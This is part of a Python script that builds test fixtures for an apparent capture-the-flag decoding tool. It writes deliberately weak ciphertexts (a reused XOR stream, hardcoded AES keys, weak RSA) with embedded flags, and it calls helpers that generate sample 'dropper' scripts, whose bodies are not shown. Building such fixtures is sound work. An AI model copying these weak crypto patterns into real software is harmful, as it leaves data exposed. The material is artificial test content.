    # with a repeating key, then base64
    script = powershell_dropper().encode()
    write("powershell_xor.b64", base64.b64encode(xor(script, b"Upd4t3r!")) + b"\n")
    # Two messages encrypted with the same key stream (two-time pad)
    stream = RNG.randbytes(80)
    write(
        "two_time_pad_1.bin", xor(b"Meet the courier at the train station tonight at nine.", stream)
    )
    write("two_time_pad_2.bin", xor(b"The password for the archive is written on the map.", stream))
    # Too short for statistics: only the crib "CYBN{" can break it (key length 5)
    short = b"Here is what you wanted: CYBN{crib_dragging_works} bye"
    write("xor_short_crib.bin", xor(short, b"Qx7#9"))

    # --- symmetric ciphers (M3) ---
    # 48-byte key||iv blob (AES-256-CBC): the blob, and a ciphertext made with it
    blob = RNG.randbytes(48)
    write("key_iv_blob.b64", base64.b64encode(blob) + b"\n")
    message = (
        b"The archive password is hunter2 and the flag is CYBN{fixture_key_iv_blob}. "
        b"Do not write it down anywhere else, please."
    )
    write(
        "aes_cbc_keyiv_blob.bin",
        AES.new(blob[:32], AES.MODE_CBC, blob[32:]).encrypt(pad(message, 16)),
    )

    # AES-256-CBC with the IV prepended to the ciphertext (the most common layout)
    key = RNG.randbytes(32)
    iv = RNG.randbytes(16)
    secret = b"CYBN{fixture_iv_prefixed} the rest of this sentence is only here as filler."
    write("aes_cbc_iv_prefix.bin", iv + AES.new(key, AES.MODE_CBC, iv).encrypt(pad(secret, 16)))
    write("aes_cbc_iv_prefix.key", key.hex() + "\n")

    # AES-256-GCM as nonce || ciphertext || tag (what most Python snippets write out)
    nonce = RNG.randbytes(12)
    gcm = AES.new(key, AES.MODE_GCM, nonce=nonce)
    body, tag = gcm.encrypt_and_digest(b"CYBN{fixture_gcm_nonce_ct_tag}")
    write("aes_gcm_nonce_ct_tag.bin", nonce + body + tag)

    # AES-128-CBC with ciphertext stealing (CS1, what openssl's -cts does): the
    # plaintext length is not a multiple of 16 and no padding was added
    cts_key = RNG.randbytes(16)
    cts_iv = RNG.randbytes(16)
    cts_plain = b"CYBN{fixture_cts_mode} short tail here"  # 38 bytes = 2 blocks + 6
    write("aes_cbc_cts.bin", cts_iv + cbc_cts_encrypt(cts_plain, cts_key, cts_iv))
    write("aes_cbc_cts.key", cts_key.hex() + "\n")

    # openssl enc with the modern KDF: -aes-256-cbc -pbkdf2 -iter 10000 -md sha256
    salt = RNG.randbytes(8)
    raw = hashlib.pbkdf2_hmac("sha256", b"infected", salt, 10000, 48)
    padded = pad(b"CYBN{fixture_openssl_pbkdf2}\n", 16)
    body = AES.new(raw[:32], AES.MODE_CBC, raw[32:]).encrypt(padded)
    write("openssl_salted_pbkdf2.bin", b"Salted__" + salt + body)

    # A Fernet token (built by hand, so the `cryptography` package is not needed)
    fernet_key = RNG.randbytes(32)
    write("fernet_key.b64", base64.urlsafe_b64encode(fernet_key) + b"\n")
    write("fernet_token.txt", fernet_token(fernet_key, b"CYBN{fixture_fernet}", 1700000000) + b"\n")

    # ChaCha20 with a 12-byte nonce prepended to the ciphertext
    chacha_key = RNG.randbytes(32)
    chacha_nonce = RNG.randbytes(12)
    stream_cipher = ChaCha20.new(key=chacha_key, nonce=chacha_nonce)
    write(
        "chacha20_nonce_prefix.bin",
        chacha_nonce + stream_cipher.encrypt(b"CYBN{fixture_chacha20} and some filler text here."),
    )
    write("chacha20_nonce_prefix.key", chacha_key.hex() + "\n")

    # XTEA-CBC, big-endian words, PKCS7 padding, 16-byte key from a passphrase
    xtea_key = hashlib.md5(b"tiny").digest()
    xtea_iv = RNG.randbytes(8)
    xtea_plain = pad(b"CYBN{fixture_xtea_cbc} delta is 0x9e3779b9", 8)
    blocks = b""
    previous = xtea_iv
    for offset in range(0, len(xtea_plain), 8):
        chunk = xtea_plain[offset : offset + 8]
        block = bytes(a ^ b for a, b in zip(chunk, previous, strict=True))
        previous = xtea_encrypt_block(block, xtea_key, "big")
        blocks += previous
    write("xtea_cbc.bin", xtea_iv + blocks)

    # --- Code Lens (M4): one script per language, each with a different API ---
    # These files are DATA. Nothing in ctfc or in the tests ever executes them.
    write("lens_dropper.py", lens_python_dropper())
    write("lens_layers.py", lens_python_layers())
    write("lens_fernet.py", lens_python_fernet())
    write("lens_dropper.ps1", lens_powershell_dropper())
    write("lens_cryptojs.js", lens_javascript_cryptojs())
    write("lens_openssl.sh", lens_bash_openssl())
    write("lens_dropper.vbs", lens_vbs_dropper())

    # Text formats recognised by prefix
    header = base64.urlsafe_b64encode(b'{"alg":"HS256","typ":"JWT"}').rstrip(b"=")
    payload = base64.urlsafe_b64encode(b'{"user":"admin"}').rstrip(b"=")
    write("jwt.txt", header + b"." + payload + b".c2lnbmF0dXJl\n")
    salt_hex = RNG.randbytes(20).hex()
    response_hex = RNG.randbytes(20).hex()
    write("mysqlna_hash.txt", f"$mysqlna${salt_hex}*{response_hex}\n")

    # --- RSA (M5) ---
    # Every key below is generated from the fixed seed, so the files never change.
    # They are all deliberately weak, one mistake each.
    write_rsa_fixtures()

    # --- pcap (improvement idea 4) ---
    write_pcap_fixture()

    # --- M7: classical ciphers, key hunting (after everything else: the seed
    # order of the earlier fixtures must not change) ---
    write_classical_fixtures()
    write_keyhunt_fixtures()

    # --- M8: shapes of the user's past challenges ---
    write_writeup_fixtures()

    # --- audit: shapes from the user's Notion challenge notes ---
    write_audit_fixtures()

    # --- weak random generators (ideas.md 1.1) ---
    write_prng_fixtures()

    # --- the attacks that need more than one message (ideas.md 2.5) ---
    write_multi_message_fixtures()

    # --- lot F: the archives that are not ZIPs, and a saved Docker image ---
    write_archive_fixtures()

    # --- lot F: the compound files that are not documents ---
    write_compound_fixtures()

    # --- Windows artefacts: what was run, and when (ideas.md 2.4) ---
    write_winartifact_fixtures()

    # --- the executables that are not PEs (ideas.md 3.1) ---
    write_executable_fixtures()

    # --- the encoding long tail (ideas.md 3.3) ---
    write_longtail_fixtures()
    write_exif_fixtures()
    write_mail_fixtures()


if __name__ == "__main__":
    main()
